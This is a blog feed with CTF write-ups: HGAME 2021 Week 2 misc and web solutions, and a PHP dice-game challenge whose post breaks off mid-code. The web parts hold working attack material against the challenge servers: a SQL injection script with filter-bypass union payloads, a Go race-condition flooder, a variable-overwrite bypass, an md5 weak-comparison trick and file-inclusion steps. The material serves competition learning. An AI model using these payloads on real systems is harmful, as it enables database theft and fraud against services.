<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hel1antHu5&#39;s Blog</title>
  
  <subtitle>Python/Go Developer</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://helianthus.top/"/>
  <updated>2021-02-14T08:57:42.104Z</updated>
  <id>https://helianthus.top/</id>
  
  <author>
    <name>Hel1antHu5</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HGAME 2021 第二周Week2 Web, Misc 详解 附脚本</title>
    <link href="https://helianthus.top/2021/02/09/21-HGAME-Week2-MiscAndWeb-WriteUp/"/>
    <id>https://helianthus.top/2021/02/09/21-HGAME-Week2-MiscAndWeb-WriteUp/</id>
    <published>2021-02-09T04:03:08.000Z</published>
    <updated>2021-02-14T08:57:42.104Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc:"></a>Misc:</h1><h3 id="misc1-Tools"><a href="#misc1-Tools" class="headerlink" title="misc1 [Tools]:"></a>misc1 [Tools]:</h3><p>第一步需要用到的是<code>F5隐写</code>,  这种隐写需要一个密码, 密码就在图片的属性中.<br>得到压缩包密码: <code>e@317S*p1A4bIYIs1M</code></p><p>第二步需要用到<code>steghide</code>, 需要的密码同样在图片属性中.<br>得到压缩包密码<code>u0!FO4JUhl5!L55%$&amp;</code></p><p>第三部需要用到<code>Outguess</code>, 需要的密码也在图片属性中<br>得到压缩包密码<code>@UjXL93044V5zl2ZKI</code></p><p>第四步需要用到<code>JPHS</code>， 需要的密码同上<br>得到压缩包密码<code>xSRejK1^Z1Cp9M!z@H</code></p><p>这样我们就得到了四份裂开的二维码, 拼接起来.</p><p><img src="/images/21/misc1_1.png" alt></p><blockquote><p>hgame{Taowa_is_N0T_g00d_but_T001s_is_Useful}</p></blockquote><h3 id="misc2-Telegraph：1601-6639-3459-3134-0892"><a href="#misc2-Telegraph：1601-6639-3459-3134-0892" class="headerlink" title="misc2 [Telegraph：1601 6639 3459 3134 0892]:"></a>misc2 [Telegraph：1601 6639 3459 3134 0892]:</h3><p>就是个简单的音频里面有一段摩斯电码啦<br><img src="/images/21/misc2_1.png" alt></p><pre><code>-.-- --- ..- .-. ..-. .-.. .- --. .. ... ---... ....- --. ----- ----- -.. ... ----- -. --. -... ..- - -. ----- - ....- --. ----- ----- -.. -- .- -. ----- ...-- ----. ...-- .---- ----- -.- ..</code></pre><blockquote><p>hgame{4G00DS0NGBUTN0T4G00DMAN039310KI}</p></blockquote><h3 id="misc3-Hallucigenia"><a href="#misc3-Hallucigenia" class="headerlink" title="misc3 [Hallucigenia]:"></a>misc3 [Hallucigenia]:</h3><p>拿到了一张png图片, 看看是不是LSB隐写, 然后在<code>Green plane 0</code>也就是绿色的最低位发现了一个二维码.<br><img src="/images/21/misc3_1.png" alt></p><p>拿去解码得到了一大段<code>base64</code></p><pre><code>gmBCrkRORUkAAAAA+jrgsWajaq0BeC3IQhCEIQhCKZw1MxTzSlNKnmJpivW9IHVPrTjvkkuI3sP7bWAEdIHWCbDsGsRkZ9IUJC9AhfZFbpqrmZBtI+ZvptWC/KCPrL0gFeRPOcI2WyqjndfUWlNj+dgWpe1qSTEcdurXzMRAc5EihsEflmIN8RzuguWq61JWRQpSI51/KHHT/6/ztPZJ33SSKbieTa1C5koONbLcf9aYmsVh7RW6p3SpASnUSb3JuSvpUBKxscbyBjiOpOTq8jcdRsx5/IndXw3VgJV6iO1+6jl4gjVpWouViO6ih9ZmybSPkhaqyNUxVXpV5cYU+Xx5sQTfKystDLipmqaMhxIcgvplLqF/LWZzIS5PvwbqOvrSlNHVEYchCEIQISICSZJijwu50rRQHDyUpaF0y///p6FEDCCDFsuW7YFoVEFEST0BAACLgLOrAAAAAggUAAAAtAAAAFJESEkNAAAAChoKDUdOUIk=</code></pre><p>解码之后很乱, 不过能看出来是PNG文件的格式, 但是字节都是反的, 需要解码之后给他再反过来一遍.</p><p>直接上脚本</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> base64cipher <span class="token operator">=</span> <span class="token string">"gmBCrkRORUkAAAAA+jrgsWajaq0BeC3IQhCEIQhCKZw1MxTzSlNKnmJpivW9IHVPrTjvkkuI3sP7bWAEdIHWCbDsGsRkZ9IUJC9AhfZFbpqrmZBtI+ZvptWC/KCPrL0gFeRPOcI2WyqjndfUWlNj+dgWpe1qSTEcdurXzMRAc5EihsEflmIN8RzuguWq61JWRQpSI51/KHHT/6/ztPZJ33SSKbieTa1C5koONbLcf9aYmsVh7RW6p3SpASnUSb3JuSvpUBKxscbyBjiOpOTq8jcdRsx5/IndXw3VgJV6iO1+6jl4gjVpWouViO6ih9ZmybSPkhaqyNUxVXpV5cYU+Xx5sQTfKystDLipmqaMhxIcgvplLqF/LWZzIS5PvwbqOvrSlNHVEYchCEIQISICSZJijwu50rRQHDyUpaF0y///p6FEDCCDFsuW7YFoVEFEST0BAACLgLOrAAAAAggUAAAAtAAAAFJESEkNAAAAChoKDUdOUIk="</span>png_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"flag.png"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>    fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>png_data<span class="token punctuation">)</span></code></pre><p>然后得到了一张…<br><img src="/images/21/misc3_2.png" alt></p><p>嗯, 真应了题目名字了, 图片还是倒影.</p><p>不过可以使用在线工具<a href="https://www.liaotiantu.com/imgtool/reverse#xztp" target="_blank" rel="noopener">https://www.liaotiantu.com/imgtool/reverse#xztp</a><br><img src="/images/21/misc3_3.png" alt></p><p>嗯, 就得到了flag。</p><blockquote><p>hgame{tenchi_souzou_dezain_bu}</p></blockquote><h3 id="misc4-DNS"><a href="#misc4-DNS" class="headerlink" title="misc4 [DNS]:"></a>misc4 [DNS]:</h3><p>一个数据包, 提示是dns, 使用wireshark打开之后看DNS的数据包, 发现了一个域名<code>flag.hgame2021.cf</code>, 拿出来去浏览器访问, 查看源码发现是无限弹窗.<br><img src="/images/21/misc4_1.png" alt></p><p>但是有个提示, <code>SPF</code>使用<code>nslookup</code>得到flag</p><pre><code>nslookup -type=txt flag.hgame2021.cf</code></pre><blockquote><p>hgame{D0main_N4me_5ystem}</p></blockquote><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h3 id="web1-LazyDogR4U"><a href="#web1-LazyDogR4U" class="headerlink" title="web1 [LazyDogR4U]:"></a>web1 [LazyDogR4U]:</h3><p>只有一个登录框, 然后尝试泄露源码, <code>www.zip</code>成功下载到网站源码.</p><p>根据<code>flag.php</code>提示, 只要<code>$_SEESION[&#39;username&#39;] === admin</code> 就可以得到flag.</p><p>然后<code>flag.php</code>引入了<code>lazy.php</code>, 再继续看<code>lazy.php</code></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"SESSION"</span><span class="token punctuation">,</span> <span class="token string">"SEVER"</span><span class="token punctuation">,</span> <span class="token string">"COOKIE"</span><span class="token punctuation">,</span> <span class="token string">"GLOBALS"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 直接注册所有变量，这样我就能少打字力，芜湖~</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'_GET'</span><span class="token punctuation">,</span><span class="token string">'_POST'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$_request</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span>$<span class="token variable">$_request</span> <span class="token keyword">as</span> <span class="token variable">$_k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$_v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$filter</span> <span class="token keyword">as</span> <span class="token variable">$youBadBad</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$_k</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$youBadBad</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$_k</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        $<span class="token punctuation">{</span><span class="token variable">$_k</span><span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token variable">$_v</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>发现这个东西可以用来赋值变量.<br><img src="/images/21/web1_1.png" alt></p><p>根据一开始的只要达成<code>$_SEESION[&#39;username&#39;] === admin</code>, 就可以得到flag了.<br>那就可以给<code>_SESSION</code>这个全局变量操作一下, 因为是个数组, 需要<code>_SESSION[key]</code>, <code>key</code>当然填写<code>username</code>啦.<br><img src="/images/21/web1_2.png" alt></p><p>并没有返回预期的<code>username|test</code>, 再次查看代码发现有<code>str_replace</code>, 会将<code>$filter</code>数组里面的几个关键字给替换成空, 可以双写绕过.<br><img src="/images/21/web1_3.png" alt></p><p>最后修改一下payload, 将test改成admin.<br><img src="/images/21/web1_4.png" alt></p><h3 id="web2-Post-to-zuckonit"><a href="#web2-Post-to-zuckonit" class="headerlink" title="web2 [Post to zuckonit]:"></a>web2 [Post to zuckonit]:</h3><p>一个简单的xss, 就是checker的速度有点慢, 导致我一直以为是xss没工作.</p><p>需要爆破一个md5的前六位相等的作为验证码, 使用python写一个就好了</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> hashlibi <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    temp <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> temp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"97874b"</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> temp<span class="token punctuation">)</span>        <span class="token keyword">break</span>    i <span class="token operator">+=</span> <span class="token number">1</span></code></pre><p><img src="/images/21/web2_1.png" alt><br>拿到token之后访问<code>/flag</code><br><img src="/images/21/web2_2.png" alt></p><blockquote><p>hgame{X5s_t0_GEt_@dm1n’s_cOokies.}</p></blockquote><h3 id="web3-200OK"><a href="#web3-200OK" class="headerlink" title="web3 [200OK!!]"></a>web3 [200OK!!]</h3><p>打开发现一个按钮, 点一下会异步发送一个请求, 请求头中有一个<code>status</code>参数, 这个参数可输入的范围是0~15, 又扫描了一下网站，也没有发现其他有价值的, 那么只有这个<code>status</code>参数可以搞了.</p><p>考虑是SQL注入, 尝试<code>1&#39; and 1=&#39;1-- -&#39;</code>, 没有回显?  </p><p>过滤了普通的sql语句, 可以使用大写绕过, 还过滤了空格, 使用<code>/**/</code>绕过.<br><img src="/images/21/web3_1.png" alt></p><p>可以看到只有一字段<br><img src="/images/21/web3_2.png" alt></p><p>好了, 知道过滤了什么, 也知道有多少个字段了, 可以去拿flag了.</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># Author: Hel1antHu5</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://200ok.liki.link/server.php"</span><span class="token keyword">def</span> <span class="token function">processPayload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    fuck <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"union"</span><span class="token punctuation">,</span> <span class="token string">"select"</span><span class="token punctuation">,</span> <span class="token string">"from"</span><span class="token punctuation">,</span> <span class="token string">"order"</span><span class="token punctuation">,</span> <span class="token string">"by"</span><span class="token punctuation">,</span> <span class="token string">"where"</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> payload<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token keyword">in</span> fuck<span class="token punctuation">:</span>            result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"/**/"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">poc</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">{</span>        <span class="token string">"status"</span><span class="token punctuation">:</span> payload    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># Input your payload</span>    <span class="token comment" spellcheck="true"># Get all databases name</span>    payload <span class="token operator">=</span> <span class="token string">"-1' union select group_concat(schema_name) from information_schema.schemata#"</span>    <span class="token comment" spellcheck="true"># Get all tables from week2sqli</span>    payload <span class="token operator">=</span> <span class="token string">"-1' union select group_concat(table_name) from information_schema.tables where table_schema='week2sqli'#"</span>    <span class="token comment" spellcheck="true"># Get all columns from week2sqli.f1111111144444444444g</span>    payload <span class="token operator">=</span> <span class="token string">"-1' union select group_concat(column_name) from information_schema.columns where table_name='f1111111144444444444g'#"</span>    <span class="token comment" spellcheck="true"># Get FLAG</span>    payload <span class="token operator">=</span> <span class="token string">"-1' union select group_concat(ffffff14gggggg) from week2sqli.f1111111144444444444g#"</span>    payload <span class="token operator">=</span> processPayload<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    poc<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></code></pre><p><img src="/images/21/web3_3.png" alt></p><blockquote><p>hgame{Con9raTu1ati0n5+yoU_FXXK~Up-tH3,5Q1!!=)}</p></blockquote><h3 id="web4-Liki的生日礼物"><a href="#web4-Liki的生日礼物" class="headerlink" title="web4 [Liki的生日礼物]"></a>web4 [Liki的生日礼物]</h3><p>打开发现是一个登录, 和注册, 是可以随便注册的,  进去之后发现是商城买switch, 然后给2000元, 52张兑换券给flag, 一个兑换券40，最多只能兑换50张, 并没有找到其他东西, 考虑去竞争脏读写数据. </p><p>就是多开几个线程去发送购买的请求包, 可以使用burp中的爆破功能, 不过我电脑性能属实对不起Java, burp开的多线程没效果, 然后想到了自己之前为了应对并发学的Go. 这里就直接用Go写了个脚本啦.</p><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span>    <span class="token string">"github.com/guonaihong/gout"</span>    <span class="token string">"net/http"</span>    <span class="token string">"time"</span><span class="token punctuation">)</span><span class="token keyword">var</span> globalChannel <span class="token operator">=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">chan</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">Process</span><span class="token punctuation">(</span>i <span class="token builtin">int</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    err <span class="token operator">:=</span> gout<span class="token punctuation">.</span>        <span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">"https://birthday.liki.link/API/?m=buy"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>        <span class="token function">SetForm</span><span class="token punctuation">(</span>gout<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"amount"</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>        <span class="token function">SetCookies</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>http<span class="token punctuation">.</span>Cookie<span class="token punctuation">{</span>Name<span class="token punctuation">:</span> <span class="token string">"PHPSESSID"</span><span class="token punctuation">,</span> Value<span class="token punctuation">:</span> <span class="token string">"pp56p2fr7iub7qbilgko87lmk1"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>        <span class="token function">SetTimeout</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> time<span class="token punctuation">.</span>Second<span class="token punctuation">)</span><span class="token punctuation">.</span>        <span class="token function">Do</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    globalChannel <span class="token operator">&lt;-</span> i<span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span>        <span class="token keyword">go</span> <span class="token function">Process</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"[+] 已启动%d号协程.\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span>        number <span class="token operator">:=</span> <span class="token operator">&lt;-</span>globalChannel        fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"[-] %d号协程任务结束.\n"</span><span class="token punctuation">,</span> number<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="/images/21/web4_1.gif" alt></p><blockquote><p>hgame{L0ck_1s_TH3_S0lllut!on!!!}</p></blockquote><hr><p>:D</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot; class=&quot;headerlink&quot; title=&quot;Misc:&quot;&gt;&lt;/a&gt;Misc:&lt;/h1&gt;&lt;h3 id=&quot;misc1-Tools&quot;&gt;&lt;a href=&quot;#misc1-Tools&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://helianthus.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://helianthus.top/tags/CTF/"/>
    
      <category term="Misc" scheme="https://helianthus.top/tags/Misc/"/>
    
      <category term="Web" scheme="https://helianthus.top/tags/Web/"/>
    
      <category term="HGAME" scheme="https://helianthus.top/tags/HGAME/"/>
    
  </entry>
  
  <entry>
    <title>记一道Web题目 Web-Game (骰子)</title>
    <link href="https://helianthus.top/2021/02/02/20-Starsnow-Web-php-game/"/>
    <id>https://helianthus.top/2021/02/02/20-Starsnow-Web-php-game/</id>
    <published>2021-02-02T14:03:46.000Z</published>
    <updated>2021-02-02T06:29:47.832Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x1-get-contents"><a href="#0x1-get-contents" class="headerlink" title="0x1 get contents"></a>0x1 get contents</h2><p>进入题目看到一个<code>PHP小游戏</code>, 是个关于骰子的, 可以猜骰子的数字和选择当前的倍数, 有1000本金.<br><img src="/images/20/1.jpg" alt><br>题目给了个提示</p><pre class=" language-php"><code class="language-php"><span class="token variable">$md5</span><span class="token operator">=</span>@<span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$money</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$md5_1</span><span class="token operator">=</span><span class="token variable">$money</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$md5_1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'xxx'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$md5_1</span><span class="token operator">==</span><span class="token string">'xxx'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> '<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alter</span><span class="token punctuation">(</span>"flag<span class="token punctuation">{</span>I<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>应该又是md5的弱类型比较.  继续看.</p><p>有个<code>说明</code>按钮, 点击之后查看url<br><img src="/images/20/2.jpg" alt><br>嗯, 文件包含… 包含谁呢…</p><p>扫描一下.<br><img src="/images/20/3.jpg" alt><br>存在git泄露, 但是没什么关键内容, 看一下<code>robots.txt</code>, 发现了<code>hint.php</code></p><h2 id="0x2-let’s-go"><a href="#0x2-let’s-go" class="headerlink" title="0x2 let’s go"></a>0x2 let’s go</h2><p>使用伪协议包含hint.php试试.<br><img src="/images/20/4.jpg" alt></p><p>数层的<code>base64</code>后, 得到了一段php代码</p><pre class=" language-php"><code class="language-php">index<span class="token punctuation">.</span>php<span class="token variable">$md5</span><span class="token operator">=</span>@<span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$money</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$md5_2</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'s878926199a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$md5_1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'s878926199a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$md5_1</span><span class="token operator">==</span><span class="token string">'s878926199a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> '<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alter</span><span class="token punctuation">(</span>"flag<span class="token punctuation">{</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>意思就是$money的md5要等于<code>s878926199a</code>的md5, 但是$money不能等于<code>s878926199a</code>.</p><p>$money在哪传？ 看一眼cookie.， 有一个被base64编码的money=…., 去找一个纯数字，MD5开头又是0e，那只有<code>240610708</code>.<br><img src="/images/20/5.jpg" alt><br>这里挺恶心的, 传入的money不用base64编码,  需要猜对的情况下才会出现, 就…多试几次. </p><p>得到<code>dejavu_c_t_f.php</code></p><h2 id="0x3-反序列化"><a href="#0x3-反序列化" class="headerlink" title="0x3 反序列化"></a>0x3 反序列化</h2><p>访问之后发现是反序列化</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">create</span><span class="token punctuation">{</span>        <span class="token keyword">var</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string">'ctfer'</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token string">'19'</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> <span class="token variable">$flag</span><span class="token operator">=</span><span class="token string">'yingzi'</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">;</span>            <span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token punctuation">;</span>            <span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">flag</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">flag</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">drive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">function</span> <span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">flag</span><span class="token operator">==</span><span class="token string">'yingzi'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">include_once</span> <span class="token string">"./flag.php"</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">'Your car turned over.'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">function</span> <span class="token function">drive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token operator">&lt;</span><span class="token number">18</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"FBI warning!!"</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token variable">$arg</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'arg'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">61</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"???"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">create</span><span class="token 